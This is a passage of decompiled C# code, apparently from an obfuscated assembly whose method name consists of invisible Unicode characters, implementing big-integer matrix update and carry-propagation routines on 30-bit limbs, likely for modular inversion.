    int num8 = (num3 & num5) + (num4 & num6);
    int num9 = _param5[0];
    int num10 = _param1[0];
    int num11 = _param2[0];
    long num12 = (long) num1 * (long) num10 + (long) num2 * (long) num11;
    long num13 = (long) num3 * (long) num10 + (long) num4 * (long) num11;
    int num14 = num7 - (_param4 * (int) num12 + num7 & 1073741823);
    int num15 = num8 - (_param4 * (int) num13 + num8 & 1073741823);
    long num16 = num12 + (long) num9 * (long) num14;
    long num17 = num13 + (long) num9 * (long) num15;
    long num18 = num16 >> 30;
    long num19 = num17 >> 30;
    for (int index = 1; index < _param0; ++index)
    {
      int num20 = _param5[index];
      int num21 = _param1[index];
      int num22 = _param2[index];
      long num23 = num18 + ((long) num1 * (long) num21 + (long) num2 * (long) num22 + (long) num20 * (long) num14);
      long num24 = num19 + ((long) num3 * (long) num21 + (long) num4 * (long) num22 + (long) num20 * (long) num15);
      _param1[index - 1] = (int) num23 & 1073741823;
      num18 = num23 >> 30;
      _param2[index - 1] = (int) num24 & 1073741823;
      num19 = num24 >> 30;
    }
    _param1[_param0 - 1] = (int) num18;
    _param2[_param0 - 1] = (int) num19;
  }

  private static void \u206F⁯‏⁮‮‌‏⁭⁭‬‮‭‍‎‍​‮⁯‏‬⁬‭⁫‭‍⁯‮‫​⁫⁮‎⁪⁫‏‪⁯⁬‬‭‮(
    int _param0,
    int[] _param1,
    int[] _param2,
    int[] _param3)
  {
    int num1 = _param3[0];
    int num2 = _param3[1];
    int num3 = _param3[2];
    int num4 = _param3[3];
    int num5 = _param1[0];
    int num6 = _param2[0];
    long num7 = (long) num1 * (long) num5 + (long) num2 * (long) num6;
    long num8 = (long) num3 * (long) num5 + (long) num4 * (long) num6;
    long num9 = num7 >> 30;
    long num10 = num8 >> 30;
    for (int index = 1; index < _param0; ++index)
    {
      int num11 = _param1[index];
      int num12 = _param2[index];
      long num13 = num9 + ((long) num1 * (long) num11 + (long) num2 * (long) num12);
      long num14 = num10 + ((long) num3 * (long) num11 + (long) num4 * (long) num12);
      _param1[index - 1] = (int) num13 & 1073741823;
      num9 = num13 >> 30;
      _param2[index - 1] = (int) num14 & 1073741823;
      num10 = num14 >> 30;
    }
    _param1[_param0 - 1] = (int) num9;
    _param2[_param0 - 1] = (int) num10;
  }
}
